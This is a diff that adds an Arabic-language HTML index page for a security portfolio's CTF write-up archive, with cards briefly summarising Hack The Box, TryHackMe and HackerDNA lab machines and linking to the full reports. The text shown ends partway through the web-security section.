@@ -1,0 +1,1113 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#07110d">
+    <meta name="color-scheme" content="dark light">
+    <meta name="description" content="أرشيف شامل وموثق لتقارير تحديات CTF واختبار الاختراق من Hack The Box و TryHackMe و HackerDNA مقسمة حسب المنصة.">
+    <title>أرشيف تقارير CTF Write-ups | Ft7y.Sec</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="avatar.png" type="image/png">
+</head>
+
+<body>
+    <a class="skip-link" href="#main-content">تخطي إلى المحتوى الرئيسي</a>
+    <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+    <div class="page-noise" aria-hidden="true"></div>
+    <canvas id="particles-canvas"></canvas>
+
+    <!-- شريط التنقل العلوي -->
+    <header class="navbar" id="navbar">
+        <div class="logo">
+            <a href="index.html#home">Ft7y<span>.Sec</span></a>
+        </div>
+
+        <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي">
+            <ul>
+                <li><a href="index.html#home">الرئيسية</a></li>
+                <li><a href="pentest.html">اختبار الاختراق</a></li>
+                <li><a href="appsec.html">أمن التطبيقات</a></li>
+                <li><a href="automation.html">البرمجة والأتمتة</a></li>
+                <li><a href="systems-labs.html">الأنظمة والمعامل</a></li>
+                <li><a href="writeups.html" class="active" aria-current="page">CTF Write-ups</a></li>
+                <li><a href="index.html#contact">تواصل معي</a></li>
+            </ul>
+        </nav>
+
+        <div class="nav-actions">
+            <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع">
+                <i class="fa-solid fa-moon"></i>
+            </button>
+            <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة">
+                <i class="fa-solid fa-bars"></i>
+            </button>
+        </div>
+    </header>
+
+    <main id="main-content" class="subpage-container">
+        <!-- ترويسة الصفحة الرئيسية -->
+        <section class="subpage-hero writeups-page-hero" data-aos="fade-up">
+            <nav class="breadcrumb-nav" aria-label="مسار التنقل">
+                <a href="index.html"><i class="fa-solid fa-house"></i> الرئيسية</a>
+                <span class="sep">/</span>
+                <span class="current">CTF Write-ups</span>
+            </nav>
+
+            <span class="section-tag"><i class="fa-solid fa-flag"></i> Comprehensive Security Archive</span>
+            <h1 class="subpage-hero-title">أرشيف تقارير CTF واختبار الاختراق</h1>
+            <p class="subpage-hero-desc">
+                مستودع شامل وموثق خطوة بخطوة لكافة الآلات والتحديات الأمنية من بيئات تدريبية مصرح بها، مقسمة بالكامل حسب المنصة مع أوامر الاستكشاف واللقطات والحلول التقنية الأصلية.
+            </p>
+
+            <div class="subpage-quick-stats">
+                <div class="quick-badge"><i class="fa-solid fa-file-lines"></i> 22+ تقريراً موثقاً</div>
+                <div class="quick-badge"><i class="fa-solid fa-cube"></i> 15 Hack The Box</div>
+                <div class="quick-badge"><i class="fa-solid fa-fire"></i> 5 TryHackMe</div>
+                <div class="quick-badge"><i class="fa-solid fa-shield-virus"></i> Web &amp; Forensics</div>
+            </div>
+
+            <!-- شريط البحث السريع المباشر -->
+            <div class="writeups-search-bar">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <input type="text" id="writeupFilterInput" class="writeups-search-input" placeholder="ابحث عن آلة، ثغرة، نظام، أو أداة (مثال: Linux, SMB, RCE, Docker, SQLi)..." aria-label="بحث في التقارير">
+            </div>
+        </section>
+
+        <!-- أدوات تصفية المنصات التفاعلية -->
+        <section class="ctf-directory-controls" data-aos="fade-up" data-aos-delay="100" aria-label="تصفية المنصات">
+            <div class="platform-tabs">
+                <button class="platform-tab active" type="button" data-platform-filter="all">
+                    <i class="fa-solid fa-grip"></i>
+                    <span>جميع المنصات (الكل)</span>
+                </button>
+                <button class="platform-tab" type="button" data-platform-filter="htb">
+                    <i class="fa-solid fa-cube"></i>
+                    <span>Hack The Box (15)</span>
+                </button>
+                <button class="platform-tab" type="button" data-platform-filter="thm">
+                    <i class="fa-solid fa-fire"></i>
+                    <span>TryHackMe (5)</span>
+                </button>
+                <button class="platform-tab" type="button" data-platform-filter="hackerdna">
+                    <i class="fa-solid fa-dna"></i>
+                    <span>HackerDNA &amp; DFIR (1)</span>
+                </button>
+                <button class="platform-tab" type="button" data-platform-filter="web">
+                    <i class="fa-solid fa-globe"></i>
+                    <span>Web Security (1)</span>
+                </button>
+            </div>
+        </section>
+
+        <!-- ==========================================
+             1. قسم منصة HACK THE BOX
+             ========================================== -->
+        <section class="platform-section-block" id="section-htb" data-platform-section="htb" data-aos="fade-up">
+            <div class="platform-section-header">
+                <h2 class="platform-section-title htb">
+                    <i class="fa-solid fa-cube"></i>
+                    <span>منصة Hack The Box</span>
+                </h2>
+                <span class="platform-count-badge">15 تقريراً وآلة</span>
+            </div>
+
+            <div class="skills-grid ctf-cards-container">
+                <!-- HTB 1: WingData -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="wingdata active directory smb network privesc windows htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/wingdata-1.png" alt="WingData HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/wingdata.html">WingData HTB Write-up</a></h3>
+                        <p class="wmc-desc">تقرير استكشاف خدمات الشبكة وتحليل مسار الاستغلال وسلسلة رفع الصلاحيات بالكامل في WingData.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 16 لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/wingdata.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 2: Facts -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="facts web cms rce linux exploit htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/facts-1.png" alt="Facts HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/facts.html">Facts HTB Machine</a></h3>
+                        <p class="wmc-desc">تحليل Web Application و CMS ومسارات الوصول إلى البيانات الحساسة واستغلال ثغرة رفع الملفات.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 13 لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/facts.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 3: Kobold -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="kobold ai docker container privesc linux htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/kobold-1.png" alt="Kobold HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/kobold.html">Kobold HTB Machine</a></h3>
+                        <p class="wmc-desc">تحدي Linux يركز على أدوات الذكاء الاصطناعي وإساءة استخدام الصلاحيات داخل حاويات Docker.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 7 لقطات موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/kobold.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 4: CCTV Write-up -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="cctv blind sqli motioneye rce ssh camera htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/cctv-writeup-1.png" alt="Write-up CCTV HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/cctv-writeup.html">Write-up CCTV HTB</a></h3>
+                        <p class="wmc-desc">تقرير كامل لتحليل ثغرة Blind SQLi واستغلال خدمة motionEye RCE ورفع الامتيازات حتى Root.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 11 لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/cctv-writeup.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 5: CCTV Machine -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="cctv machine recon surface port scan htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/cctv-machine-1.png" alt="CCTV Machine HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/cctv-machine.html">CCTV HTB Machine</a></h3>
+                        <p class="wmc-desc">توثيق تقني لعمليات الاستكشاف الأولية وتحليل سطح الهجوم وتعداد المنافذ والخدمات في جهاز CCTV.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 3 لقطات موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/cctv-machine.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 6: Devarea -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="devarea developer git source auth bypass htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/devarea-1.png" alt="Devarea HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/devarea.html">Devarea HTB Write-up</a></h3>
+                        <p class="wmc-desc">تقرير اختبار اختراق لجهاز Devarea، من مرحلة الاستكشاف حتى تحليل الخدمات والتحكم بالنظام.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 12 لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/devarea.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 7: DevHub -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="devhub git repository token leak season 11 htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/devhub-1.png" alt="DevHub HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/devhub.html">DevHub HTB Write-up</a></h3>
+                        <p class="wmc-desc">توثيق عملي لاختبار اختراق آلة DevHub على Hack The Box في الموسم الحادي عشر وسحب الأعلام.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 10 لقطات موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/devhub.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 8: Flag Command -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="flag command game terminal javascript analysis htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/flag-command-1.png" alt="Flag Command HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/flag-command.html">Flag Command</a></h3>
+                        <p class="wmc-desc">تقرير تقني يركز على استكشاف كود الواجهة البرمجية وأوامر استخراج الأعلام من البيئة التفاعلية.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 5 لقطات موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/flag-command.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 9: PingPong -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="pingpong windows insane active directory kerberos htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/pingpong-1.png" alt="PingPong HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge insane wmc-diff-top">Insane</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/pingpong.html">PingPong Windows Machine</a></h3>
+                        <p class="wmc-desc">تقرير آلة Windows بمستوى احترافي عالي (Insane) مع توثيق مسار الهجوم المتقدم.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/pingpong.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 10: Silentium -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="silentium linux easy suid root htb">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/silentium-1.png" alt="Silentium HTB" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/silentium.html">Silentium Linux Machine</a></h3>
+                        <p class="wmc-desc">تقرير جهاز Linux بمستوى سهل يشمل خطوات الحل الأصلية واستغلال الخدمات للوصول لصلاحيات Root.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> لقطة موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/silentium.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 11: SmartHire -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="smarthire web recruitment hr portal api htb">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-user-tie"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/smarthire.html">SmartHire HTB Write-up</a></h3>
+                        <p class="wmc-desc">تقرير تقني موثق لاختبار منصة التوظيف والخدمات المرتبطة بها واستخراج البيانات الأمنية.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-solid fa-file-code"></i> توثيق تقني</span>
+                            <a class="btn-read-modal" href="ctfs/smarthire.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 12: Connected -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="connected iot vpn network traffic analysis htb">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-tower-broadcast"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/connected.html">Connected HTB Write-up</a></h3>
+                        <p class="wmc-desc">تحليل تقني متقدم لمحتوى Connected والآليات الأمنية الشبكية وأنظمة التحكم المرتبطة به.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-solid fa-file-code"></i> توثيق تقني</span>
+                            <a class="btn-read-modal" href="ctfs/connected.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 13: Lame (Interactive Modal) -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="lame samba cve-2007-2447 rce root linux metasploit htb">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-cube"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('lame-htb'); return false;">Lame — ثغرة Samba usermap_script RCE</a></h3>
+                        <p class="wmc-desc">استغلال ثغرة CVE-2007-2447 في خدمة Samba 3.0.20 والحصول على اتصال Root Shell مباشر عبر Metasploit و Python.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 12 دقيقة</span>
+                            <button class="btn-read-modal" onclick="openWriteup('lame-htb')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 14: Bashed (Interactive Modal) -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="bashed phpbash webshell cron root privesc linux htb">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-terminal"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('bashed-htb'); return false;">Bashed — اكتشاف Web Shell وترقية Cron</a></h3>
+                        <p class="wmc-desc">اكتشاف phpbash Web Shell مخفي في مسار المطورين، ترقية الصلاحيات إلى scriptmanager، واستغلال Cron Job بصلاحيات Root.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 14 دقيقة</span>
+                            <button class="btn-read-modal" onclick="openWriteup('bashed-htb')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- HTB 15: Jerry (Interactive Modal) -->
+                <article class="writeup-media-card" data-category="htb" data-keywords="jerry tomcat war msfvenom backdoor windows system htb">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-brands fa-windows"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag htb wmc-badge-top"><i class="fa-solid fa-cube"></i> Hack The Box</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('jerry-htb'); return false;">Jerry — ثغرة Tomcat Manager الافتراضية</a></h3>
+                        <p class="wmc-desc">الدخول للوحة إدارة Tomcat باستخدام بيانات الاعتماد الافتراضية، ورفع ملف WAR خبيث للحصول على تحكم كامل بالنظام بصلاحيات SYSTEM.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 9 دقائق</span>
+                            <button class="btn-read-modal" onclick="openWriteup('jerry-htb')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </section>
+
+        <!-- ==========================================
+             2. قسم منصة TRYHACKME
+             ========================================== -->
+        <section class="platform-section-block" id="section-thm" data-platform-section="thm" data-aos="fade-up">
+            <div class="platform-section-header">
+                <h2 class="platform-section-title thm">
+                    <i class="fa-solid fa-fire"></i>
+                    <span>منصة TryHackMe</span>
+                </h2>
+                <span class="platform-count-badge">5 تقارير وغرف</span>
+            </div>
+
+            <div class="skills-grid ctf-cards-container">
+                <!-- THM 1: Blue -->
+                <article class="writeup-media-card" data-category="thm" data-keywords="blue eternalblue ms17-010 smb windows system tryhackme thm">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-fire"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag thm wmc-badge-top"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('blue-thm'); return false;">Blue — استغلال ثغرة EternalBlue (MS17-010)</a></h3>
+                        <p class="wmc-desc">استغلال ثغرة تنفيذ الأوامر عن بُعد في بروتوكول SMBv1 على نظام Windows 7 للحصول على صلاحيات NT AUTHORITY\SYSTEM وقراءة الأعلام.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 8 دقائق</span>
+                            <button class="btn-read-modal" onclick="openWriteup('blue-thm')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- THM 2: Kenobi -->
+                <article class="writeup-media-card" data-category="thm" data-keywords="kenobi proftpd samba suid path hijacking linux privesc thm">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-folder-tree"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag thm wmc-badge-top"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('kenobi-thm'); return false;">Kenobi — ثغرات Samba &amp; ProFTPD وتصعيد SUID</a></h3>
+                        <p class="wmc-desc">استكشاف مشاركات SMB و NFS، استغلال ثغرة mod_copy في ProFTPD 1.3.5 لاستخراج مفاتيح SSH، ثم ترقية الصلاحيات إلى Root.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 10 دقائق</span>
+                            <button class="btn-read-modal" onclick="openWriteup('kenobi-thm')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- THM 3: Pickle Rick -->
+                <article class="writeup-media-card" data-category="thm" data-keywords="picklerick command injection filter bypass linux web thm">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-code"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag thm wmc-badge-top"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('picklerick-thm'); return false;">Pickle Rick — حقن الأوامر وتخطي الفلاتر</a></h3>
+                        <p class="wmc-desc">استخراج بيانات الاعتماد وتخطي قيود حظر الأوامر في لوحة التحكم للحصول على المكونات الثلاثة بصلاحيات كاملة.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 7 دقائق</span>
+                            <button class="btn-read-modal" onclick="openWriteup('picklerick-thm')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- THM 4: StartUP -->
+                <article class="writeup-media-card" data-category="thm" data-keywords="startup spice hut ftp anonymous wireshark cron linux thm">
+                    <div class="wmc-thumb">
+                        <img src="assets/images/ctfs/startup-1.png" alt="StartUP THM" loading="lazy">
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag thm wmc-badge-top"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/startup.html">StartUP THM Machine</a></h3>
+                        <p class="wmc-desc">تقرير تحدي Spice Hut مع استغلال خدمة FTP المجهولة وتحليل حركة المرور بـ Wireshark ورفع الامتيازات.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-image"></i> 3 لقطات موثقة</span>
+                            <a class="btn-read-modal" href="ctfs/startup.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- THM 5: Wonderland -->
+                <article class="writeup-media-card" data-category="thm" data-keywords="wonderland rabbit python library hijacking privesc thm">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-hat-wizard"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag thm wmc-badge-top"><i class="fa-solid fa-fire"></i> TryHackMe</span>
+                        <span class="difficulty-badge medium wmc-diff-top">Medium</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="ctfs/wonderland.html">Wonderland Machine</a></h3>
+                        <p class="wmc-desc">توثيق تقني لغرفة Wonderland مع استغلال Python Library Hijacking وتصعيد الامتيازات عبر مستخدمين متعددين.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-solid fa-file-code"></i> توثيق تقني</span>
+                            <a class="btn-read-modal" href="ctfs/wonderland.html">
+                                <span>قراءة التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </a>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </section>
+
+        <!-- ==========================================
+             3. قسم منصة HACKERDNA والتحقيق الجنائي الرقمي
+             ========================================== -->
+        <section class="platform-section-block" id="section-hackerdna" data-platform-section="hackerdna" data-aos="fade-up">
+            <div class="platform-section-header">
+                <h2 class="platform-section-title dna">
+                    <i class="fa-solid fa-dna"></i>
+                    <span>منصة HackerDNA والتحقيق الجنائي الرقمي (DFIR)</span>
+                </h2>
+                <span class="platform-count-badge">تقرير متخصص</span>
+            </div>
+
+            <div class="skills-grid ctf-cards-container">
+                <!-- HackerDNA 1: Forensics -->
+                <article class="writeup-media-card" data-category="hackerdna" data-keywords="forensics dfir autopsy binwalk fat32 deleted recovery evidence digital hackerdna">
+                    <div class="wmc-thumb">
+                        <div class="default-thumb-cyber"><i class="fa-solid fa-microscope"></i></div>
+                        <div class="wmc-thumb-overlay"></div>
+                        <span class="platform-tag hackerdna wmc-badge-top"><i class="fa-solid fa-dna"></i> HackerDNA</span>
+                        <span class="difficulty-badge easy wmc-diff-top">Easy</span>
+                    </div>
+                    <div class="wmc-body">
+                        <h3 class="wmc-title"><a href="#" onclick="openWriteup('forensics-dfir'); return false;">الطب الشرعي الرقمي — استرداد وتحليل البيانات</a></h3>
+                        <p class="wmc-desc">فحص صورة قرص بنظام ملفات FAT32 باستخدام Autopsy و Binwalk لاستعادة المستندات المحذوفة من المساحة غير المخصصة وكشف الأدلة.</p>
+                        <div class="wmc-footer">
+                            <span class="wmc-meta"><i class="fa-regular fa-clock"></i> 11 دقيقة</span>
+                            <button class="btn-read-modal" onclick="openWriteup('forensics-dfir')">
+                                <span>عرض التقرير</span>
+                                <i class="fa-solid fa-arrow-left"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+            </div>
+        </section>
+
+        <!-- ==========================================
+             4. قسم أمن تطبيقات الويب (WEB SECURITY)
+             ========================================== -->
+        <section class="platform-section-block" id="section-web" data-platform-section="web" data-aos="fade-up">
+            <div class="platform-section-header">
+                <h2 class="platform-section-title web">
